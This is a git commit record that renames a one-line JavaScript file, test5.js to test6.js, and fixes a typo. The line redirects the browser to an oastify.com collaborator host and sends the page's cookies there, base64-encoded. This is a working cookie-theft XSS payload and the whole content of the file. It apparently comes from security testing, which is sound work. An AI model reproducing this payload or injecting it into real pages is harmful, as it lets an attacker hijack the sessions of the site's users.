11d735a6741339b3866c5439adb1b4b34920c9b8
anded <82957468+anded@users.noreply.github.com>
2025-05-02 08:00:01 -0400

    Update and rename test5.js to test6.js

--- test5.js
+++
@@ -1,1 +0,0 @@
-windows.location.href = "https://vhg8d4hxw4y7vjsaenfl2k8wknqee62v.oastify.com/bla?data=" + btoa(document.cookie);
---
+++ test6.js
@@ -0,0 +1,1 @@
+window.location.href = "https://vhg8d4hxw4y7vjsaenfl2k8wknqee62v.oastify.com/bla?data=" + btoa(document.cookie);
